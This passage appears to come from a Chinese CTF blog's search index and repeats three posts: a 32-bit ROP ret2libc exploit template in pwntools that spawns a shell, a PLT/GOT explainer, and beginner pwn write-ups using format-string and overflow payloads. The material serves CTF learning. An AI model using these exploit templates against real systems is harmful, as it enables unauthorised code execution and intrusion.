p32(read_plt) + p32(pop3_ret) + p32(0) + p32(bss_addr) + p32(8) payload += p32(system_addr) + p32(main_addr) + p32(bss_addr) payload += \u0026#39;/bin/sh\\x00\u0026#39; send_payload(payload) #**************************** p.interactive() ","date":"July 11, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/en/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/","summary":"32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; process_name = \u0026#39;./\u0026#39; #p = process([process_name], env={\u0026#39;LD_LIBRARY_PATH\u0026#39;:\u0026#39;./\u0026#39;}) p = remote(\u0026#39;\u0026#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = \u0026#39;A\u0026#39;*(偏移) + payload p.sendlineafter(\u0026#39;\u0026#39;, payload) main_addr = write_plt = elf.plt[\u0026#39;write\u0026#39;] write_got = elf.got[\u0026#34;write\u0026#34;] payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(\u0026#34;write_addr =\u0026gt; %#x\u0026#34;, write_addr) libc = LibcSearcher(\u0026#39;write\u0026#39;, write_addr) libc_base = write_addr - libc.","tags":null,"title":"32位栈溢出rop模板"},{"categories":null,"contents":"32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; process_name = \u0026#39;./\u0026#39; #p = process([process_name], env={\u0026#39;LD_LIBRARY_PATH\u0026#39;:\u0026#39;./\u0026#39;}) p = remote(\u0026#39;\u0026#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = \u0026#39;A\u0026#39;*(偏移) + payload p.sendlineafter(\u0026#39;\u0026#39;, payload) main_addr = write_plt = elf.plt[\u0026#39;write\u0026#39;] write_got = elf.got[\u0026#34;write\u0026#34;] payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(\u0026#34;write_addr =\u0026gt; %#x\u0026#34;, write_addr) libc = LibcSearcher(\u0026#39;write\u0026#39;, write_addr) libc_base = write_addr - libc.dump(\u0026#39;write\u0026#39;) system_addr = libc_base + libc.dump(\u0026#39;system\u0026#39;) binsh_addr = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) log.info(\u0026#34;system_addr =\u0026gt; %#x\u0026#34;, system_addr) log.info(\u0026#34;binsh_addr =\u0026gt; %#x\u0026#34;, binsh_addr) #********************* #*********************调用system（“/bin/sh”） select = 1 if select == 1: #方案1 payload = p32(system_addr) + p32(main_addr) + p32(binsh_addr) else: #方案2 read_plt = elf.plt[\u0026#39;read\u0026#39;] pop3_ret = 0x0804856c bss_addr = elf.bss() payload = p32(read_plt) + p32(pop3_ret) + p32(0) + p32(bss_addr) + p32(8) payload += p32(system_addr) + p32(main_addr) + p32(bss_addr) payload += \u0026#39;/bin/sh\\x00\u0026#39; send_payload(payload) #**************************** p.interactive() ","date":"July 11, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/","summary":"32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; process_name = \u0026#39;./\u0026#39; #p = process([process_name], env={\u0026#39;LD_LIBRARY_PATH\u0026#39;:\u0026#39;./\u0026#39;}) p = remote(\u0026#39;\u0026#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = \u0026#39;A\u0026#39;*(偏移) + payload p.sendlineafter(\u0026#39;\u0026#39;, payload) main_addr = write_plt = elf.plt[\u0026#39;write\u0026#39;] write_got = elf.got[\u0026#34;write\u0026#34;] payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(\u0026#34;write_addr =\u0026gt; %#x\u0026#34;, write_addr) libc = LibcSearcher(\u0026#39;write\u0026#39;, write_addr) libc_base = write_addr - libc.","tags":null,"title":"32位栈溢出rop模板"},{"categories":null,"contents":"32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; process_name = \u0026#39;./\u0026#39; #p = process([process_name], env={\u0026#39;LD_LIBRARY_PATH\u0026#39;:\u0026#39;./\u0026#39;}) p = remote(\u0026#39;\u0026#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = \u0026#39;A\u0026#39;*(偏移) + payload p.sendlineafter(\u0026#39;\u0026#39;, payload) main_addr = write_plt = elf.plt[\u0026#39;write\u0026#39;] write_got = elf.got[\u0026#34;write\u0026#34;] payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(\u0026#34;write_addr =\u0026gt; %#x\u0026#34;, write_addr) libc = LibcSearcher(\u0026#39;write\u0026#39;, write_addr) libc_base = write_addr - libc.dump(\u0026#39;write\u0026#39;) system_addr = libc_base + libc.dump(\u0026#39;system\u0026#39;) binsh_addr = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) log.info(\u0026#34;system_addr =\u0026gt; %#x\u0026#34;, system_addr) log.info(\u0026#34;binsh_addr =\u0026gt; %#x\u0026#34;, binsh_addr) #********************* #*********************调用system（“/bin/sh”） select = 1 if select == 1: #方案1 payload = p32(system_addr) + p32(main_addr) + p32(binsh_addr) else: #方案2 read_plt = elf.plt[\u0026#39;read\u0026#39;] pop3_ret = 0x0804856c bss_addr = elf.bss() payload = p32(read_plt) + p32(pop3_ret) + p32(0) + p32(bss_addr) + p32(8) payload += p32(system_addr) + p32(main_addr) + p32(bss_addr) payload += \u0026#39;/bin/sh\\x00\u0026#39; send_payload(payload) #**************************** p.interactive() ","date":"July 11, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/zh-tw/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/","summary":"32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; process_name = \u0026#39;./\u0026#39; #p = process([process_name], env={\u0026#39;LD_LIBRARY_PATH\u0026#39;:\u0026#39;./\u0026#39;}) p = remote(\u0026#39;\u0026#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = \u0026#39;A\u0026#39;*(偏移) + payload p.sendlineafter(\u0026#39;\u0026#39;, payload) main_addr = write_plt = elf.plt[\u0026#39;write\u0026#39;] write_got = elf.got[\u0026#34;write\u0026#34;] payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(\u0026#34;write_addr =\u0026gt; %#x\u0026#34;, write_addr) libc = LibcSearcher(\u0026#39;write\u0026#39;, write_addr) libc_base = write_addr - libc.","tags":null,"title":"32位栈溢出rop模板"},{"categories":null,"contents":"plt与got理解 0x1 基础知识 .got GOT(Global Offset Table)全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。\n.plt PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt 没有所需地址的时，触发「链接器」去找到所需地址。\n.got.plt 这个是 GOT 专门为 PLT 专门准备的节。说白了，.got.plt 中的值是 GOT 的一部分。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。\n.plt.got 貌似没啥用。\n0x2 理解 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main(int argc, char **argv) { puts(\u0026#34;Hello world!\u0026#34;); puts(\u0026#34;Hello CTF!\u0026#34;) exit(0); } 当调用第一次puts时，流程如下\n第二次调用puts时，流程如下\n0x3 总结 .plt 的作用简而言之就是先去 .got.plt 里面找地址，如果找的到，就去执行函数，如果是下一条指令的地址，说明没有，就会去触发链接器找到地址。\n.got.plt 显而易见用来存储地址，.got.plt 确实是 GOT 的一部分。\n","date":"July 11, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/en/posts/plt%E4%B8%8Egot/","summary":"plt与got理解 0x1 基础知识 .got GOT(Global Offset Table)全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。\n.plt PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt 没有所需地址的时，触发「链接器」去找到所需地址。\n.got.plt 这个是 GOT 专门为 PLT 专门准备的节。说白了，.got.plt 中的值是 GOT 的一部分。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。\n.plt.got 貌似没啥用。\n0x2 理解 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main(int argc, char **argv) { puts(\u0026#34;Hello world!\u0026#34;); puts(\u0026#34;Hello CTF!\u0026#34;) exit(0); } 当调用第一次puts时，流程如下\n第二次调用puts时，流程如下\n0x3 总结 .plt 的作用简而言之就是先去 .got.plt 里面找地址，如果找的到，就去执行函数，如果是下一条指令的地址，说明没有，就会去触发链接器找到地址。\n.got.plt 显而易见用来存储地址，.got.plt 确实是 GOT 的一部分。","tags":null,"title":"Plt与got"},{"categories":null,"contents":"plt与got理解 0x1 基础知识 .got GOT(Global Offset Table)全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。\n.plt PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt 没有所需地址的时，触发「链接器」去找到所需地址。\n.got.plt 这个是 GOT 专门为 PLT 专门准备的节。说白了，.got.plt 中的值是 GOT 的一部分。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。\n.plt.got 貌似没啥用。\n0x2 理解 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main(int argc, char **argv) { puts(\u0026#34;Hello world!\u0026#34;); puts(\u0026#34;Hello CTF!\u0026#34;) exit(0); } 当调用第一次puts时，流程如下\n第二次调用puts时，流程如下\n0x3 总结 .plt 的作用简而言之就是先去 .got.plt 里面找地址，如果找的到，就去执行函数，如果是下一条指令的地址，说明没有，就会去触发链接器找到地址。\n.got.plt 显而易见用来存储地址，.got.plt 确实是 GOT 的一部分。\n","date":"July 11, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/posts/plt%E4%B8%8Egot/","summary":"plt与got理解 0x1 基础知识 .got GOT(Global Offset Table)全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。\n.plt PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt 没有所需地址的时，触发「链接器」去找到所需地址。\n.got.plt 这个是 GOT 专门为 PLT 专门准备的节。说白了，.got.plt 中的值是 GOT 的一部分。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。\n.plt.got 貌似没啥用。\n0x2 理解 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main(int argc, char **argv) { puts(\u0026#34;Hello world!\u0026#34;); puts(\u0026#34;Hello CTF!\u0026#34;) exit(0); } 当调用第一次puts时，流程如下\n第二次调用puts时，流程如下\n0x3 总结 .plt 的作用简而言之就是先去 .got.plt 里面找地址，如果找的到，就去执行函数，如果是下一条指令的地址，说明没有，就会去触发链接器找到地址。\n.got.plt 显而易见用来存储地址，.got.plt 确实是 GOT 的一部分。","tags":null,"title":"Plt与got"},{"categories":null,"contents":"plt与got理解 0x1 基础知识 .got GOT(Global Offset Table)全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。\n.plt PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt 没有所需地址的时，触发「链接器」去找到所需地址。\n.got.plt 这个是 GOT 专门为 PLT 专门准备的节。说白了，.got.plt 中的值是 GOT 的一部分。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。\n.plt.got 貌似没啥用。\n0x2 理解 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main(int argc, char **argv) { puts(\u0026#34;Hello world!\u0026#34;); puts(\u0026#34;Hello CTF!\u0026#34;) exit(0); } 当调用第一次puts时，流程如下\n第二次调用puts时，流程如下\n0x3 总结 .plt 的作用简而言之就是先去 .got.plt 里面找地址，如果找的到，就去执行函数，如果是下一条指令的地址，说明没有，就会去触发链接器找到地址。\n.got.plt 显而易见用来存储地址，.got.plt 确实是 GOT 的一部分。\n","date":"July 11, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/zh-tw/posts/plt%E4%B8%8Egot/","summary":"plt与got理解 0x1 基础知识 .got GOT(Global Offset Table)全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。\n.plt PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt 没有所需地址的时，触发「链接器」去找到所需地址。\n.got.plt 这个是 GOT 专门为 PLT 专门准备的节。说白了，.got.plt 中的值是 GOT 的一部分。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。\n.plt.got 貌似没啥用。\n0x2 理解 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main(int argc, char **argv) { puts(\u0026#34;Hello world!\u0026#34;); puts(\u0026#34;Hello CTF!\u0026#34;) exit(0); } 当调用第一次puts时，流程如下\n第二次调用puts时，流程如下\n0x3 总结 .plt 的作用简而言之就是先去 .got.plt 里面找地址，如果找的到，就去执行函数，如果是下一条指令的地址，说明没有，就会去触发链接器找到地址。\n.got.plt 显而易见用来存储地址，.got.plt 确实是 GOT 的一部分。","tags":null,"title":"Plt与got"},{"categories":null,"contents":"攻防世界WP 新手区 题目 get shell 题目描述： 运行就能拿到shell呢，真的\n题目分析： nc链接，运行，拿到shell\n解题： 1.nc链接IP（端口是空格）\n2.ls查看文件，cat flag 获得flag\n题目 CGfsb 题目描述： 菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用\n题目分析： 1.从题目描述来看，解题的关键是prinf\n2.查看文件格式，保护设置，运行一下\n发现是一个32位的文件，开启了NX、Stack保护\n这是程序的流程\n3.结合分析，应该和格式化字符串漏洞有关，放到IDA中具体看一下\n这是一个高危漏洞！！！具体用法先放着，往下看。\n看到这边有一个system函数，里面的内容是“cat flag”，这就是答案！！！\n而想要运行这行代码需要一个条件 pwnme==8，这时候想到前面有一个漏洞。\n4.格式化字符串漏洞的简单运用\n%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表\t示将0x64写入偏移10处保存的指针所指向的地址\n解题： 1.已经知道了存在格式化字符串漏洞，开始利用，查看偏移量\n输入aaaa，发现0x61616161（aaaa）偏移量为10\n2.编写脚本\npayload解释：将pwnme的地址转换为一个4字节的数，因为前面输出8个字符，通过%10$n，可以将8写入第10个偏移量对应的地址（pwenme的地址）里\n3.运行\n拿到falg\n4.注：\n还可以这样写payload=‘aaaa’+p32（0x0804A068）+'%11$n'\n题目 when_did_you_born 题目描述： 只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办\n题目分析： 1.从描述来看，关键在于“年龄”\n2.查看文件格式，保护设置，运行一下\n64位，开启了stack、NX保护。\n这是程序基本流程。\n3.扔到IDA中看一下\n答案就在这！！！\n整体看一下\n所以思路很明显了，想办法去执行system就可以了。但问题是两个if不能一起执行。此时注意到前面有一个\n漏洞……\n查看一下\nv4下面正好是v5，那就可以直接覆盖了\n解题： 解决。\n题目 hello_pwn 题目描述： pwn！，segment fault! 菜鸡陷入了深思\n题目分析： 1.题目描述貌似没啥用，不管了\n2.查看文件，保护，运行一下\n64位，开启了NX保护\n就一句话……\n3.扔到IDA中看一下\n可以看到只要运行这个函数就可以拿到flag\n这是条件。\n这时候发现一个漏洞\n好了，可以直接利用溢出完成题目了\n解题： 完成。\n题目 level0 题目描述： 菜鸡了解了什么是溢出，他相信自己能得到shell\n题目分析： 1.从分析来看，解题关键是拿到shell\n2.查看文件，保护，运行\n64位，NX保护。\n嗯，就一句话，没啥用。\n3.扔进IDA里面看一下\n发现这个函数，那么只要让它执行这个函数，就可以拿到shell了。\n发现这边有一个溢出。开始编写脚本。\n解题： 编写脚本\n 利用一个溢出将callsystem函数的地址编写进去\n完成。\n题目 level2 题目描述： 菜鸡请教大神如何获得flag，大神告诉他‘使用’面向返回的编程（ROP）就可以了\n题目分析： 1.从题目描述可知，要用到ROP技术。\n2.查看文件格式，保护，运行。\n32位，NX保护\n程序流程。\n3.扔进IDA里看一下。\n存在system函数，可以将‘/bin/sh’，写入，获得shell\n存在溢出漏洞。可以开始编写脚本了\n解题： 构建system（/bin/sh），获得shell\n完成。\n题目 string 题目描述： 菜鸡遇到了Dragon,有一位巫师可以帮助他逃离危险，但似乎需要一些要求\n题目分析： 1.从题目描述来看，解题的关键在“巫师”\n2.查看文件格式，保护。\n64位，保护除了PIE都开了。\n3.扔到IDA里面看一下。（400CA6）\nok，找到巫师了，不过，需要条件*a1==a1[1]。\n观察一下，可以发现*a1==a1[1],即要满足 *v3==v3[1]。\n这时候发现这边存在一个输出漏洞。（printf(\u0026amp;……，\u0026amp;……)）\n想到使用%n来修改值。\n查看一下偏移量。\n偏移量是7。\n再来找一下地址。\n这边泄露了v4地址，即v3\n并且出现了可以将v1变成一个函数来执行外部命令的语句。\n解题： 完成。\n题目 int_overflow 题目描述： 菜鸡感觉这题似乎没有办法溢出，真的么？\n题目分析： 1.从题目来看，这题解题关键在于“int_overflow”\n2.查看文件，保护，运行\n3.扔进IDA里面看一下\n一个溢出漏洞\n条件\n这时候联想到题目的提示int_overflow\n无符号int型，最大256，257开始长度变为1\n又发现这个……\n解题： 完成。\n题目 cgpwn2 题目描述： 菜鸡认为自己需要一个字符串\n题目分析： 1.查看文件，保护，运行。\n2.扔进IDA里面看一下\n很明显的一个漏洞\n调用了system函数，但是打印“hehehe”。去找了一下有没有“/bin/sh”，没找到。只能自己输入了\n解题： 完成。\n","date":"July 7, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/en/posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/","summary":"攻防世界WP 新手区 题目 get shell 题目描述： 运行就能拿到shell呢，真的\n题目分析： nc链接，运行，拿到shell\n解题： 1.nc链接IP（端口是空格）\n2.ls查看文件，cat flag 获得flag\n题目 CGfsb 题目描述： 菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用\n题目分析： 1.从题目描述来看，解题的关键是prinf\n2.查看文件格式，保护设置，运行一下\n发现是一个32位的文件，开启了NX、Stack保护\n这是程序的流程\n3.结合分析，应该和格式化字符串漏洞有关，放到IDA中具体看一下\n这是一个高危漏洞！！！具体用法先放着，往下看。\n看到这边有一个system函数，里面的内容是“cat flag”，这就是答案！！！\n而想要运行这行代码需要一个条件 pwnme==8，这时候想到前面有一个漏洞。\n4.格式化字符串漏洞的简单运用\n%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表\t示将0x64写入偏移10处保存的指针所指向的地址\n解题： 1.已经知道了存在格式化字符串漏洞，开始利用，查看偏移量\n输入aaaa，发现0x61616161（aaaa）偏移量为10\n2.编写脚本\npayload解释：将pwnme的地址转换为一个4字节的数，因为前面输出8个字符，通过%10$n，可以将8写入第10个偏移量对应的地址（pwenme的地址）里\n3.运行\n拿到falg\n4.注：\n还可以这样写payload=‘aaaa’+p32（0x0804A068）+'%11$n'\n题目 when_did_you_born 题目描述： 只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办\n题目分析： 1.从描述来看，关键在于“年龄”\n2.查看文件格式，保护设置，运行一下\n64位，开启了stack、NX保护。\n这是程序基本流程。\n3.扔到IDA中看一下\n答案就在这！！！\n整体看一下\n所以思路很明显了，想办法去执行system就可以了。但问题是两个if不能一起执行。此时注意到前面有一个\n漏洞……\n查看一下\nv4下面正好是v5，那就可以直接覆盖了\n解题： 解决。\n题目 hello_pwn 题目描述： pwn！，segment fault! 菜鸡陷入了深思\n题目分析： 1.题目描述貌似没啥用，不管了\n2.查看文件，保护，运行一下\n64位，开启了NX保护\n就一句话……","tags":null,"title":"攻防世界WP"},{"categories":null,"contents":"攻防世界WP 新手区 题目 get shell 题目描述： 运行就能拿到shell呢，真的\n题目分析： nc链接，运行，拿到shell\n解题： 1.nc链接IP（端口是空格）\n2.ls查看文件，cat flag 获得flag\n题目 CGfsb 题目描述： 菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用\n题目分析： 1.从题目描述来看，解题的关键是prinf\n2.查看文件格式，保护设置，运行一下\n发现是一个32位的文件，开启了NX、Stack保护\n这是程序的流程\n3.结合分析，应该和格式化字符串漏洞有关，放到IDA中具体看一下\n这是一个高危漏洞！！！具体用法先放着，往下看。\n看到这边有一个system函数，里面的内容是“cat flag”，这就是答案！！！\n而想要运行这行代码需要一个条件 pwnme==8，这时候想到前面有一个漏洞。\n4.格式化字符串漏洞的简单运用\n%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表\t示将0x64写入偏移10处保存的指针所指向的地址\n解题： 1.已经知道了存在格式化字符串漏洞，开始利用，查看偏移量\n输入aaaa，发现0x61616161（aaaa）偏移量为10\n2.编写脚本\npayload解释：将pwnme的地址转换为一个4字节的数，因为前面输出8个字符，通过%10$n，可以将8写入第10个偏移量对应的地址（pwenme的地址）里\n3.运行\n拿到falg\n4.注：\n还可以这样写payload=‘aaaa’+p32（0x0804A068）+'%11$n'\n题目 when_did_you_born 题目描述： 只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办\n题目分析： 1.从描述来看，关键在于“年龄”\n2.查看文件格式，保护设置，运行一下\n64位，开启了stack、NX保护。\n这是程序基本流程。\n3.扔到IDA中看一下\n答案就在这！！！\n整体看一下\n所以思路很明显了，想办法去执行system就可以了。但问题是两个if不能一起执行。此时注意到前面有一个\n漏洞……\n查看一下\nv4下面正好是v5，那就可以直接覆盖了\n解题： 解决。\n题目 hello_pwn 题目描述： pwn！，segment fault! 菜鸡陷入了深思\n题目分析： 1.题目描述貌似没啥用，不管了\n2.查看文件，保护，运行一下\n64位，开启了NX保护\n就一句话……\n3.扔到IDA中看一下\n可以看到只要运行这个函数就可以拿到flag\n这是条件。\n这时候发现一个漏洞\n好了，可以直接利用溢出完成题目了\n解题： 完成。\n题目 level0 题目描述： 菜鸡了解了什么是溢出，他相信自己能得到shell\n题目分析： 1.从分析来看，解题关键是拿到shell\n2.查看文件，保护，运行\n64位，NX保护。\n嗯，就一句话，没啥用。\n3.扔进IDA里面看一下\n发现这个函数，那么只要让它执行这个函数，就可以拿到shell了。\n发现这边有一个溢出。开始编写脚本。\n解题： 编写脚本\n 利用一个溢出将callsystem函数的地址编写进去\n完成。\n题目 level2 题目描述： 菜鸡请教大神如何获得flag，大神告诉他‘使用’面向返回的编程（ROP）就可以了\n题目分析： 1.从题目描述可知，要用到ROP技术。\n2.查看文件格式，保护，运行。\n32位，NX保护\n程序流程。\n3.扔进IDA里看一下。\n存在system函数，可以将‘/bin/sh’，写入，获得shell\n存在溢出漏洞。可以开始编写脚本了\n解题： 构建system（/bin/sh），获得shell\n完成。\n题目 string 题目描述： 菜鸡遇到了Dragon,有一位巫师可以帮助他逃离危险，但似乎需要一些要求\n题目分析： 1.从题目描述来看，解题的关键在“巫师”\n2.查看文件格式，保护。\n64位，保护除了PIE都开了。\n3.扔到IDA里面看一下。（400CA6）\nok，找到巫师了，不过，需要条件*a1==a1[1]。\n观察一下，可以发现*a1==a1[1],即要满足 *v3==v3[1]。\n这时候发现这边存在一个输出漏洞。（printf(\u0026amp;……，\u0026amp;……)）\n想到使用%n来修改值。\n查看一下偏移量。\n偏移量是7。\n再来找一下地址。\n这边泄露了v4地址，即v3\n并且出现了可以将v1变成一个函数来执行外部命令的语句。\n解题： 完成。\n题目 int_overflow 题目描述： 菜鸡感觉这题似乎没有办法溢出，真的么？\n题目分析： 1.从题目来看，这题解题关键在于“int_overflow”\n2.查看文件，保护，运行\n3.扔进IDA里面看一下\n一个溢出漏洞\n条件\n这时候联想到题目的提示int_overflow\n无符号int型，最大256，257开始长度变为1\n又发现这个……\n解题： 完成。\n题目 cgpwn2 题目描述： 菜鸡认为自己需要一个字符串\n题目分析： 1.查看文件，保护，运行。\n2.扔进IDA里面看一下\n很明显的一个漏洞\n调用了system函数，但是打印“hehehe”。去找了一下有没有“/bin/sh”，没找到。只能自己输入了\n解题： 完成。\n","date":"July 7, 2021","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/","summary":"攻防世界WP 新手区 题目 get shell 题目描述： 运行就能拿到shell呢，真的\n题目分析： nc链接，运行，拿到shell\n解题： 1.nc链接IP（端口是空格）\n2.ls查看文件，cat flag 获得flag\n题目 CGfsb 题目描述： 菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用\n题目分析： 1.从题目描述来看，解题的关键是prinf\n2.查看文件格式，保护设置，运行一下\n发现是一个32位的文件，开启了NX、Stack保护\n这是程序的流程\n3.结合分析，应该和格式化字符串漏洞有关，放到IDA中具体看一下\n这是一个高危漏洞！！！具体用法先放着，往下看。\n看到这边有一个system函数，里面的内容是“cat flag”，这就是答案！！！\n而想要运行这行代码需要一个条件 pwnme==8，这时候想到前面有一个漏洞。\n4.格式化字符串漏洞的简单运用\n%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表\t示将0x64写入偏移10处保存的指针所指向的地址\n解题： 1.已经知道了存在格式化字符串漏洞，开始利用，查看偏移量\n输入aaaa，发现0x61616161（aaaa）偏移量为10\n2.编写脚本\npayload解释：将pwnme的地址转换为一个4字节的数，因为前面输出8个字符，通过%10$n，可以将8写入第10个偏移量对应的地址（pwenme的地址）里\n3.运行\n拿到falg\n4.注：\n还可以这样写payload=‘aaaa’+p32（0x0804A068）+'%11$n'\n题目 when_did_you_born 题目描述： 只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办\n题目分析： 1.从描述来看，关键在于“年龄”\n2.查看文件格式，保护设置，运行一下\n64位，开启了stack、NX保护。\n这是程序基本流程。\n3.扔到IDA中看一下\n答案就在这！！！\n整体看一下\n所以思路很明显了，想办法去执行system就可以了。但问题是两个if不能一起执行。此时注意到前面有一个\n漏洞……\n查看一下\nv4下面正好是v5，那就可以直接覆盖了\n解题： 解决。\n题目 hello_pwn 题目描述： pwn！，segment fault! 菜鸡陷入了深思\n题目分析： 1.题目描述貌似没啥用，不管了\n2.查看文件，保护，运行一下\n64位，开启了NX保护\n就一句话……","tags":null,"title":"攻防世界WP"},{"categories":null,"contents":"攻防世界WP 新手区 题目 get shell 题目描述： 运行就能拿到shell呢，真的\n题目分析： nc链接，运行，拿到shell\n解题： 1.nc链接IP（端口是空格）\n2.ls查看文件，cat flag 获得flag\n题目 CGfsb 题目描述： 菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用\n题目分析： 1.从题目描述来看，解题的关键是prinf\n2.查看文件格式，保护设置，运行一下\n发现是一个32位的文件，开启了NX、Stack保护\n这是程序的流程\n3.结合分析，应该和格式化字符串漏洞有关，放到IDA中具体看一下\n这是一个高危漏洞！！！具体用法先放着，往下看。\n看到这边有一个system函数，里面的内容是“cat flag”，这就是答案！！！\n而想要运行这行代码需要一个条件 pwnme==8，这时候想到前面有一个漏洞。\n4.格式化字符串漏洞的简单运用\n%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表\t示将0x64写入偏移10处保存的指针所指向的地址\n解题： 1.已经知道了存在格式化字符串漏洞，开始利用，查看偏移量\n输入aaaa，发现0x61616161（aaaa）偏移量为10\n2.编写脚本\npayload解释：将pwnme的地址转换为一个4字节的数，因为前面输出8个字符，通过%10$n，可以将8写入第10个偏移量对应的地址（pwenme的地址）里\n3.运行\n拿到falg\n4.注：\n还可以这样写payload=‘aaaa’+p32（0x0804A068）+'%11$n'\n题目 when_did_you_born 题目描述： 只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办\n题目分析： 1.从描述来看，关键在于“年龄”\n2.查看文件格式，保护设置，运行一下\n64位，开启了stack、NX保护。\n这是程序基本流程。\n3.扔到IDA中看一下\n答案就在这！！！\n整体看一下\n所以思路很明显了，想办法去执行system就可以了。但问题是两个if不能一起执行。此时注意到前面有一个\n漏洞……\n查看一下\nv4下面正好是v5，那就可以直接覆盖了\n解题： 解决。\n题目 hello_pwn 题目描述： pwn！，segment fault! 菜鸡陷入了深思\n题目分析： 1.题目描述貌似没啥用，不管了\n2.查看文件，保护，运行一下\n64位，开启了NX保护\n就一句话……\n3.扔到IDA中看一下\n可以看到只要运行这个函数就可以拿到flag\n这是条件。\n这时候发现一个漏洞\n好了，可以直接利用溢出完成题目了\n解题： 完成。\n题目 level0 题目描述： 菜鸡了解了什么是溢出，他相信自己能得到shell\n题目分析： 